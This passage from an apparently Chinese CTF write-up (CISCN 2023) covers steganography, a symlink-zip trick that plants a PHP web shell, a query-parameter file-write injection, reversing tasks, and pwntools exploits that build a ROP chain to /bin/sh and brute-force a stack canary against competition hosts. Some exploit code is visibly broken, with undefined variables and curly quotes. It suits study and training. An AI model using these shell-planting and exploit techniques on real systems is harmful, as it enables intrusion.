class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br><span class="hljs-keyword">import</span> libnum<br>folder_path = <span class="hljs-string">&quot;H:/py_test/ciss/tmp4&quot;</span>  <span class="hljs-comment"># 将 /path/to/folder 替换为实际的文件夹路径</span><br><br><span class="hljs-comment"># 获取文件夹中的所有文件名，并将其转换为数字进行排序（排除不是数字的文件名）</span><br>file_names = os.listdir(folder_path)<br>file_names_sorted = []<br><br>bmp = &#123;&#125;<br><br>xor = &#123;&#125;<br><br>bmp_l = <span class="hljs-number">0</span> <span class="hljs-comment">#宽7110</span><br>bmp_h = <span class="hljs-number">0</span> <span class="hljs-comment">#高3900</span><br>y_m = <span class="hljs-number">500</span> <span class="hljs-comment"># 取反最下面的图片，y的位置是500 在大多数情况下，坐标系的原点通常位于画布的左上角。</span><br>height = <span class="hljs-number">100</span><br>padding =&#123;&#125;<br><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> file_names:<br><br>        file_names_sorted.append(name)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;../tmp4/<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;rb+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.seek(<span class="hljs-number">6</span>)<br>            byte_data1 = f.read(<span class="hljs-number">2</span>)<br>            f.seek(<span class="hljs-number">8</span>)  <span class="hljs-comment"># 将文件指针移动到第8个字节的位置</span><br>            byte_data2 = f.read(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 读取两个字节</span><br>            x = <span class="hljs-built_in">int</span>.from_bytes(byte_data1, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 将二进制数据转换为整数</span><br>            y = <span class="hljs-built_in">int</span>.from_bytes(byte_data2, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>,signed=<span class="hljs-literal">True</span>)<br>            f.seek(<span class="hljs-number">18</span>)<br>            byte_width = f.read(<span class="hljs-number">2</span>)<br>            pad = <span class="hljs-number">0</span>  <span class="hljs-comment"># 承担每次填充值的字节</span><br>            <span class="hljs-comment"># if (name == &#x27;10322267058.bmp&#x27;):</span><br>            width = <span class="hljs-built_in">int</span>.from_bytes(byte_width, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">if</span> (width * <span class="hljs-number">3</span> % <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>: <span class="hljs-comment"># 先判断是否有填充的可能</span><br>                    pad_n = <span class="hljs-number">4</span> - width * <span class="hljs-number">3</span> % <span class="hljs-number">4</span> <span class="hljs-comment"># 判断填充大小</span><br>                    pad_data = <span class="hljs-string">b&#x27;&#x27;</span><br>                    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):<br>                        tmp = <span class="hljs-number">54</span> + i * width * <span class="hljs-number">3</span> + pad<br>                        f.seek(tmp)  <span class="hljs-comment"># 跳过像素点</span><br>                        byte_data = f.read(pad_n)<br>                        <span class="hljs-comment"># print(byte_data)</span><br>                        pad_data += byte_data<br>                        pad += pad_n<br>                    <span class="hljs-keyword">if</span> y <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> padding.keys():<br>                        padding.update(&#123;y: []&#125;)<br>                    padding[y].append([x, pad_data,name]) <span class="hljs-comment"># 按照y作为key，保存每行每个图片的x坐标和数据，x坐标是用于对照片排序</span><br>padding2 = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">sorted</span>(padding.items(), key=<span class="hljs-keyword">lambda</span> items: items[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 排序行</span><br><span class="hljs-built_in">print</span>(padding2.keys())<br>allPaddingData = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> key, values <span class="hljs-keyword">in</span> padding2.items():<br>    <span class="hljs-built_in">print</span>(key)<br>    values = <span class="hljs-built_in">sorted</span>(values, key=<span class="hljs-keyword">lambda</span> value: value[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 行内排序，也就是x坐标排序</span><br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values:<br>        allPaddingData += value[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(allPaddingData))<br><br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;3.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(allPaddingData)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230531201852652.png" alt="image-20230531201852652"></p><p>最后被一个小小的代码逻辑卡了4个小时，惭愧惭愧</p><p>最后的flag是</p><p>flag{f1R5T_part_1s_LSB_ sTeG0_2nd_paRT_15_reVeRSe_bMp_3rd_parT_1s_paddINGINGING}</p><p>谢谢大佬的提点：<a href="https://byxs20.github.io/posts/19413.html#part3">https://byxs20.github.io/posts/19413.html#part3</a></p><h1 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h1><p>这题参考2021深育杯线上初赛ZIPZIP</p><p>先构造一个指向 &#x2F;var&#x2F;www&#x2F;html的软连接(因为html目录下是web环境，为了后续可以getshell)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>利用命令(zip –symlinks test.zip .&#x2F;*)对test文件进行压缩</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528171817804.png" alt="image-20230528171817804"></p><p>再构造一个压缩包</p><p>我们先创建一个test目录(因为上一个压缩包里边目录就是test)，在test目录下写一个shell文件，在压缩创建的test目录 此时压缩包目录架构是：test&#x2F;cmd.php</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528172106112.png" alt="image-20230528172106112"></p><p>压缩</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528172221642.png" alt="image-20230528172221642"></p><p>先后上传这两个zip，访问根目录即可</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528172402610.png" alt="image-20230528172402610"></p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528172711953.png" alt="image-20230528172711953"></p><p>flag{1dc4d0ee-9981-459c-aa05-d886c084e3af}</p><h1 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h1><p>开局给出提示<img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528173036643.png" alt="image-20230528173036643"></p><p>经过测试，这个是执行sql语句</p><p>db&#x3D;&amp;table_2_dump&#x3D;这里是可以写入文件的，</p><p>写个phpinfo()测试</p><p>?db&#x3D;&amp;table_2_dump&#x3D;&lt;?=phpinfo()?&gt; 2&gt;log&#x2F;1.php</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528173618989.png" alt="image-20230528173618989"></p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528173643552.png" alt="image-20230528173643552"></p><p>flag{92dfb34b-31e3-459d-8720-f78b3a2fdb26}</p><h1 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h1><p>打开附件发现网址<a href="https://snap.berkeley.edu/">https://snap.berkeley.edu</a></p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528174157389.png" alt="image-20230528174157389"></p><p>在这个网址打开附件</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528174505186.png" alt="image-20230528174505186"></p><p>这是一个图形化编程文件，审计右边红框中的代码得知：后一个数要对前一个数进行异或；把左边红框中的数值按照其逻辑抄写下来</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528174640071.png" alt="image-20230528174640071"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,len(s)):<br><span class="hljs-attribute">s</span>[i]^=s[i-<span class="hljs-number">1</span>]<br><span class="hljs-comment">#print(s)</span><br><span class="hljs-attribute">print</span>(&#x27;&#x27;.join(chr(i) for i in s:))<br></code></pre></td></tr></table></figure><h1 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h1><p>ssh连接上查看环境变量看到flag</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/3F0EBB30D22B31A5B1A63BBA8264BA21.png" alt="img"></p><h1 id="sign-in-passwd"><a href="#sign-in-passwd" class="headerlink" title="sign_in_passwd"></a>sign_in_passwd</h1><p>打开附件发现</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">j2rXjx8yjd</span><span class="hljs-operator">=</span>YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd<span class="hljs-operator">=</span>D<br>GHI3KLMNJOPQRSTUb%<span class="hljs-number">3</span>DcdefghijklmnopWXYZ%<span class="hljs-number">2</span>F12%<span class="hljs-number">2</span>B406789VaqrstuvwxyzABCDEF5<br></code></pre></td></tr></table></figure><p>base64换表</p><p>第二行先url解码</p><p>GHI3KLMNJOPQRSTUb&#x3D;cdefghijklmnopWXYZ&#x2F;12+406789VaqrstuvwxyzABCDEF5</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230528180055976.png" alt="image-20230528180055976"></p><p>flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}</p><h1 id="Shaokao"><a href="#Shaokao" class="headerlink" title="Shaokao"></a>Shaokao</h1><p>思路：先成为vip，然后gaiming进行栈溢出。</p><p>利用：利用负数来增加金钱，成为vip，然后向文件中写入&#x2F;bin&#x2F;sh，然后构造execve系统调用的ROP获得shell。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># coding=UTF-8</span><br><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">filename</span> = &#x27;./shaokao&#x27;<br><span class="hljs-attribute">libc_name</span> = &#x27;./shaokao&#x27;<br><br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;tmux&#x27;,&#x27;split&#x27;,&#x27;-vp&#x27;,&#x27;80&#x27;]</span><br><span class="hljs-attribute">context</span>.binary = filename<br><br><span class="hljs-attribute">elf</span> = ELF(filename)<br><span class="hljs-attribute">libc</span> = ELF(libc_name)<br><br><span class="hljs-attribute">debug</span> = <span class="hljs-number">0</span><br><span class="hljs-attribute">if</span> debug:<br>    <span class="hljs-attribute">p</span> = process(filename)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">p</span> = remote(<span class="hljs-string">&quot;39.105.187.49&quot;</span>,<span class="hljs-number">12425</span>)<br><br><span class="hljs-comment"># gdb.attach(p, &quot;bp  0x401F5C&quot;)</span><br><br><span class="hljs-attribute">def</span> pijiu(index, number):<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, str(<span class="hljs-number">1</span>))<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;3. 勇闯天涯&quot;</span>, str(index))<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;来几瓶？&quot;</span>, str(number))<br><br><span class="hljs-attribute">def</span> chuan():<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, str(<span class="hljs-number">2</span>))<br><br><span class="hljs-attribute">def</span> yue():<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, str(<span class="hljs-number">3</span>))<br><br><span class="hljs-attribute">def</span> vip():<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, str(<span class="hljs-number">4</span>))<br><br><span class="hljs-attribute">def</span> gaiming():<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, str(<span class="hljs-number">5</span>))<br><br><span class="hljs-comment"># context.os        = &#x27;linux&#x27;</span><br><span class="hljs-comment"># context.endian    = &#x27;little&#x27;</span><br><span class="hljs-comment"># context.word_size = 64</span><br><span class="hljs-comment"># shellcode=asm(shellcraft.execve(&quot;/bin/bash&quot;))</span><br><br><span class="hljs-attribute">pijiu</span>(<span class="hljs-number">1</span>, -<span class="hljs-number">10000</span>)<br><span class="hljs-attribute">yue</span>()<br><span class="hljs-attribute">vip</span>()<br><span class="hljs-attribute">gaiming</span>()<br><br><span class="hljs-attribute">rax_ret</span> = <span class="hljs-number">0</span>x0000000000458827<br><span class="hljs-attribute">rax_rdx_rbx_ret</span> = <span class="hljs-number">0</span>x00000000004a404a<br><span class="hljs-attribute">rdi_ret</span> = <span class="hljs-number">0</span>x000000000040264f<br><span class="hljs-attribute">rsi_ret</span> = <span class="hljs-number">0</span>x000000000040a67e<br><span class="hljs-comment"># rdx_rbx_ret = 0x00000000004a404b</span><br><span class="hljs-attribute">syscall</span> = <span class="hljs-number">0</span>x0000000000402404<br><br><span class="hljs-attribute">ret_1</span> = <span class="hljs-number">0</span>x000000000042a665<br><span class="hljs-attribute">bin_bash</span> = <span class="hljs-number">0</span>x7361622f6e69622f<br><br><span class="hljs-attribute">push_rax</span> = <span class="hljs-number">0</span>x000000000045bb51<br><br><span class="hljs-attribute">write</span> = <span class="hljs-number">0</span>x4e6000<br><br><span class="hljs-comment"># mov_rax_rsi = 0x45af95</span><br><br><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span>x20 + b<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span>x8 + p64(rsi_ret) + p64(write)  + p64(rax_ret) + b<span class="hljs-string">&quot;/bin/sh&quot;</span>.ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&quot;\x00&quot;</span>) + p64(mov_rax_rsi) + p64(rdi_ret) +  p64(write) +p64(rax_ret) + p64(<span class="hljs-number">0</span>x3b) +  p64(rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(rdx_rbx_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># payload = b&quot;A&quot;*0x20 + b&quot;A&quot;*0x8 + p64(rax_ret) + p64(0x3b) + p64(rdi_ret) + p64(rsi_ret) + p64(0) + p64(rdx_rbx_ret) + p64(0) + p64(0) + p64(syscall)</span><br><span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>, payload)<br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>思路：通过爆破canary和system(cat flag)低字节来获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&#x27;./funcanary&#x27;</span><br>libc_name = <span class="hljs-string">&#x27;./funcanary&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;split&#x27;</span>,<span class="hljs-string">&#x27;-vp&#x27;</span>,<span class="hljs-string">&#x27;80&#x27;</span>]<br>context.binary = filename<br><br>elf = ELF(filename)<br>libc = ELF(libc_name)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(filename)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>, <span class="hljs-number">27650</span>)<br><br><span class="hljs-comment"># gdb.attach(p, &quot;b read&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;welcome\n&quot;</span>)<br>canary = <span class="hljs-string">&quot;\x00&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        p.send(<span class="hljs-number">0x67</span>*<span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-string">&quot;\x00&quot;</span> + canary + <span class="hljs-built_in">chr</span>(j))<br>        contxt = p.recvuntil(<span class="hljs-string">b&quot;welcome&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;have fun&quot;</span> <span class="hljs-keyword">in</span> contxt:<br>            canary += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span> + canary)<br>            <span class="hljs-keyword">break</span><br>system = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = <span class="hljs-number">0x002004</span><br><span class="hljs-built_in">print</span>(system)<br><span class="hljs-comment"># canary = bytearray(canary,&#x27;utf-8&#x27;)</span><br>a = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> canary:<br>    a += <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">ord</span>(i)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x67</span> + <span class="hljs-string">b&quot;\x00&quot;</span> + a + p64(<span class="hljs-number">0</span>) + p16(system)<br><span class="hljs-comment"># gdb.attach(p)</span><br>System_ = <span class="hljs-number">0x1231</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    addr = i * <span class="hljs-number">16</span> + <span class="hljs-number">0x2</span><br>    payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x67</span> + b”\x00” + canary + <span class="hljs-string">&#x27;b&#x27;</span>* <span class="hljs-number">8</span> + <span class="hljs-string">&#x27;\x31&#x27;</span> + <span class="hljs-built_in">chr</span>(addr)<br>    p.send(payload)<br>    mag= p.recvuntil(‘welcome’)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> mag:<br>        <span class="hljs-built_in">print</span>(ret)<br>        <span class="hljs-keyword">break</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ciscn2023 Misc部分复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
